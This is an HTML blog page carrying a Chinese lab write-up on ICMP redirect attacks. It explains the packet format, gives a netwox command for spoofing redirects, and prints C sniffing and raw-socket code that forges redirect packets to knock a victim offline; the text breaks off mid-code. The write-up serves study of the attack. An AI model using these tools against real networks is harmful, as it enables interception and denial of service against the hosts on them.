@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="（新搭了博客，贴一篇远古前的文章看看效果） 一 实验原理ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表，如果黑客要求该主机将网关修改为黑客自己的机器，就使得该主机在发送数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ICMP重定向攻击">
+<meta property="og:url" content="https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="K4NN0N&#39;s Website">
+<meta property="og:description" content="（新搭了博客，贴一篇远古前的文章看看效果） 一 实验原理ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表，如果黑客要求该主机将网关修改为黑客自己的机器，就使得该主机在发送数">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://k4nn0n.github.io/images/v2-8251c5a0153ce618bcd82c838402afa5_1440w.webp">
+<meta property="og:image" content="https://k4nn0n.github.io/images/image-20221211152620226.png">
+<meta property="og:image" content="https://k4nn0n.github.io/images/image-20221211152658388.png">
+<meta property="og:image" content="https://k4nn0n.github.io/images/image-20221211152713423.png">
+<meta property="og:image" content="https://k4nn0n.github.io/images/image-20221211153200226.png">
+<meta property="og:image" content="https://k4nn0n.github.io/images/image-20221211153220185.png">
+<meta property="og:image" content="https://k4nn0n.github.io/images/image-20221211153235749.png">
+<meta property="article:published_time" content="2022-12-11T07:19:38.223Z">
+<meta property="article:modified_time" content="2022-12-11T07:40:41.729Z">
+<meta property="article:author" content="K4NN0N">
+<meta property="article:tag" content="uncatogerised">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://k4nn0n.github.io/images/v2-8251c5a0153ce618bcd82c838402afa5_1440w.webp">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/image1.jpeg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/image1.jpeg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/image1.jpeg">
+        
+      
+    
+    <!-- title -->
+    <title>ICMP重定向攻击</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/12/10/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&text=ICMP重定向攻击"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&is_video=false&description=ICMP重定向攻击"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ICMP重定向攻击&body=Check out this article: https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&title=ICMP重定向攻击"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&name=ICMP重定向攻击&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://k4nn0n.github.io/2022/12/11/ICMP%E9%87%8D%E5%AE%9A%E5%90%91%E6%94%BB%E5%87%BB/&t=ICMP重定向攻击"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">一 实验原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">二 实验环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.</span> <span class="toc-text">三 实验步骤</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        ICMP重定向攻击
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">K4NN0N</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-12-11T07:19:38.223Z" itemprop="datePublished">2022-12-11</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/uncatogerised/" rel="tag">uncatogerised</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>（新搭了博客，贴一篇远古前的文章看看效果）</p>
+<h2 id="一-实验原理"><a href="#一-实验原理" class="headerlink" title="一 实验原理"></a>一 实验原理</h2><p>ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表，如果黑客要求该主机将网关修改为黑客自己的机器，就使得该主机在发送数据包时，都会被黑客获取，进一步实现中间人攻击或者DOS攻击。</p>
+<p>ICMP数据包格式：</p>
+<p><img src="/../images/v2-8251c5a0153ce618bcd82c838402afa5_1440w.webp" alt="img"></p>
+<p>有多种不同的ICMP报文，每种报文都有自己的格式，但是所有的ICMP报文都有三个共同的字段：</p>
+<ul>
+<li>TYPE(8-bit): identifies the message</li>
+<li>CODE(8-bit): provides further information about the message type</li>
+<li>CHECKSUM(16-bit)</li>
+<li>In addition, ICMP messages that report errors always include the header and the first 64 data bits of the datagram causing the problem.</li>
+</ul>
+<p>TYPE字段：8位</p>
+<ul>
+<li>0:Echo Reply</li>
+<li>3:Destination Unreachable</li>
+<li>4:Source Quench</li>
+<li>5:Redirect (change route)</li>
+<li>8:Echo Request</li>
+<li>9:Router Advertisement</li>
+<li>10:Router Solicitation</li>
+<li>11:time Exceeded for a Datagram</li>
+<li>12:Parameter Problem on a Datagram</li>
+<li>13:timestamp Request</li>
+<li>14:Timestamp Reply</li>
+<li>17:Address Mask Request</li>
+<li>18:Address Mask Reply</li>
+</ul>
+<p>在此要实现的是ICMP的重定向，所以编码时TYPE应该为5，在写PING包的时候，请求时的TYPE应该为8，而回复时应该为0 。</p>
+<p>CODE字段：8位</p>
+<ul>
+<li>0:network unreachable</li>
+<li>1:host unreachable</li>
+<li>2:protocol unreachable</li>
+<li>3:port unreachable</li>
+<li>4:fragmentation needed and DF(don’t fragment) set</li>
+<li>5: source route failed</li>
+</ul>
+<p>CHECKSUM：16位校验和。</p>
+<p>Gateway Internet Address：对于ICMP重定向包，需要让对方依照收到的网关地址将路由表中的网关地址进行修改。</p>
+<p>DATA：包内容，需要28字节的数据，包括原始IP数据报的头部（20字节）及其数据部分的前8字节。</p>
+<p>综上，在进行发包的时候我们需要填写内容有：20字节的IP包头部+8字节的ICMP包头部+28字节的数据部分。</p>
+<h2 id="二-实验环境"><a href="#二-实验环境" class="headerlink" title="二 实验环境"></a>二 实验环境</h2><ol>
+<li><p>Mac OS IP地址：192.168.1.97（攻击机）</p>
+</li>
+<li><p>Ubuntu IP地址：192.168.1.4（被攻击机）</p>
+</li>
+<li><p>Kali Linux IP地址：192.168.1.14（攻击机）</p>
+</li>
+<li><p>原始网关地址：192.168.1.1</p>
+</li>
+</ol>
+<h2 id="三-实验步骤"><a href="#三-实验步骤" class="headerlink" title="三 实验步骤"></a>三 实验步骤</h2><ol>
+<li>使用netwox体会实验效果，使用netwox 86发送ICMP重定向包，</li>
+</ol>
+<p>sudo netwox 86 –g 192.168.1.97 –i 192.168.1.1</p>
+<p>被攻击机使用ping <a href="https://link.zhihu.com/?target=http://baidu.com">http://baidu.com</a>命令，可以得到以下结果：</p>
+<p><img src="/../images/image-20221211152620226.png" alt="image-20221211152620226"></p>
+<p>表示netwox成功进行了ICMP重定向。</p>
+<p>启动wireshark，观察netwox发出的数据包：</p>
+<p><img src="/../images/image-20221211152658388.png" alt="image-20221211152658388"></p>
+<p>通过wireshark抓包查看所发出的数据包的源IP是.1而不是攻击者真实的IP；</p>
+<p>通过抓包，查看攻击数据包的结构</p>
+<p><img src="/../images/image-20221211152713423.png" alt="image-20221211152713423"></p>
+<p>请注意，ICMP重定向报文除了ICMP包中的通用头部之外，还包括原始IP头部信息和数据报文的前8个字节。也即，在构造ICMP重定向包中，除了头部之外，还需要额外的28字节（在IP头部没有可选字段的情况下）</p>
+<p>另外，注意观察，netwox发出的ICMP重定向包的目的IP是受害者正通信的IP，也即，netwox先抓到受害者的数据包，根据捕获包的IP地址，再构造攻击包。</p>
+<ol start="2">
+<li>在充分了解实验原理的基础上，自己使用raw socket，写出来一个icmp redirect包，达到使受害者不能正常上网的目的。</li>
+</ol>
+<p>代码如下：</p>
+<ol>
+<li>主函数</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: %s Attacker-ip Target-ip Gateway\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ip_atk = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">ip_tgt = argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">ip_gw = argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">dev = FindDev(); <span class="comment">//查找dev</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;attacker: %s\ntarget: %s\nGateway: %s\nFounded Device: %s\nStart ICMP redirecting...\n&quot;</span>,ip_atk, ip_tgt, ip_gw, dev);</span><br><span class="line"></span><br><span class="line">sniff(dev);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主函数引导用户输入攻击机ip，受害者ip，网关地址，然后利用FindDev()函数查找主机默认的设备。然后执行sniff()嗅探过程。</p>
+<ol start="2">
+<li>FindDev()</li>
+</ol>
+<p>用于查找默认设备。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">FindDev</span><span class="params">()</span>&#123; <span class="comment">// 查找默认设备</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *dev, errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line"></span><br><span class="line">dev = pcap_lookupdev(errbuf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dev == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Couldn&#x27;t find default device: %s\n&quot;</span>, errbuf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dev;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>嗅探</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sniff</span><span class="params">(<span class="type">char</span> * dev)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="type">pcap_t</span> * handle;</span><br><span class="line"></span><br><span class="line">bpf_u_int32 net = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">bpf_u_int32 mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_program</span> <span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filter_exp[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">//filter_exp内容为过滤表达式</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sprintf</span>(filter_exp, <span class="string">&quot;src host %s&quot;</span>, ip_tgt);<span class="comment">// 过滤表达式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pcap_lookupnet(dev, &amp;net, &amp;mask, errbuf) == <span class="number">-1</span>)</span><br><span class="line">  <span class="comment">//pcap_lookupnet（）是一个函数，给定设备的名称，返回其中一个IPv4网络号和相应的网络掩码（网络号是IPv4地址与网络掩码进行AND运算，因此它只包含地址的网络部分）。</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Can&#x27;t get netmask for device %s\n&quot;</span>, dev);</span><br><span class="line"></span><br><span class="line">net = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">mask = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle = pcap_open_live(dev, <span class="number">65535</span>, <span class="number">1</span>, <span class="number">100</span>, errbuf);</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数是我们在上一节中指定的设备。 snaplen是一个整数，它定义了pcap要捕获的最大字节数。 promisc，当设置为true时，将接口带入混杂模式（但是，即使设置为false，也可能在特定情况下接口处于混杂模式，无论如何）。 to_ms是读取超时（以毫秒为单位）（值为0表示没有time out；至少在某些平台上，这意味着可能要等到足够数量的数据包到达才能看到任何数据包，因此应该使用非零值）。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Couldn&#x27;t open device %s: %s\n&quot;</span>, dev, errbuf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pcap_compile(handle, &amp;fp, filter_exp, <span class="number">0</span>, net) == <span class="number">-1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数是我们的会话句柄（前一个例子中的pcap_t *句柄）。 接下来是对我们将存储过滤器的编译版本的位置的引用。 表达式本身就是常规字符串格式。 接下来是一个整数，它决定表达式是否应该“优化”（0为假，1为真。）最后，我们必须指定过滤器适用的网络的网络掩码。 失败时函数返回-1；所有其他值意味着成功。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Couldn&#x27;t parse filter %s: %s\n&quot;</span>, filter_exp, pcap_geterr(handle));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pcap_setfilter(handle, &amp;fp) == <span class="number">-1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一个参数是我们的会话处理程序，第二个参数是对表达式的编译版本的引用（可能是与pcap_compile（）的第二个参数相同的变量）。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Couldn&#x27;t install filter %s: %s\n&quot;</span>, filter_exp, pcap_geterr(handle));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pcap_loop(handle, <span class="number">-1</span>, Redirect, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//第一个参数是我们的会话句柄。接下来是一个整数，它告诉pcap_loop（）在返回之前它应该嗅探多少个数据包（负值意味着它应该嗅探直到发生错误）。第三个参数是回调函数的名称（只是函数名，没有括号）。最后一个参数在某些应用程序中很有用，但很多时候只是设置为NULL。</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>嗅探过程利用到pcap。</p>
+<p>其中pcap_open_live()打开设备进行嗅探。</p>
+<p>pcap_compile（）进行流量过滤，设置过滤表达式，来接收来自受害者主机的包。</p>
+<p>pcap_setfilter()为对过滤表达式的应用。</p>
+<p>之后执行pcap_loop()使其持续进行嗅探的操作，并且在接收到数据包时，调用回调函数Redirect来发送重定向包。</p>
+<ol start="4">
+<li>回调函数Redirect()发包</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Redirect</span><span class="params">(u_char *arg, <span class="type">const</span> <span class="keyword">struct</span> pcap_pkthdr *pkthdr, <span class="type">const</span> u_char *packet)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sockfd;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) &lt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//int socket( int af, int type, int protocol);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//af：一个地址描述。仅支持AF_INET格式，也就是说ARPA Internet地址格式。 AF_INET使用IPv4协议</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//type：指定socket类型。发送ICMP所以使用原始套接字SOCK_RAW</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//protocol：指定协议。</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;create sockfd error\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;detected a packet...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入socket描述符，原始数据帧地址</span></span><br><span class="line"></span><br><span class="line">u_char out_packet[<span class="number">20</span> + <span class="number">8</span> + <span class="number">28</span>]; <span class="comment">//20为ip头部 8字节icmp头 28字节为针对的原始ip首部及数据部分前28字节</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip</span> *<span class="title">iph</span> =</span> (<span class="keyword">struct</span> ip *)out_packet; <span class="comment">//ipHeader</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">icmp</span> *<span class="title">icmph</span> =</span> (<span class="keyword">struct</span> icmp *)(out_packet + <span class="number">20</span>); <span class="comment">//icmpHeader</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//填充ip头部内容</span></span><br><span class="line"></span><br><span class="line">iph-&gt;ip_v = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_hl = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_tos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_ttl = <span class="number">255</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_len = <span class="number">56</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_off = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_p = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">iph-&gt;ip_sum = <span class="number">0</span>; <span class="comment">//抓包的时候显示ip检验和没有检验 所以不用填也可以</span></span><br><span class="line"></span><br><span 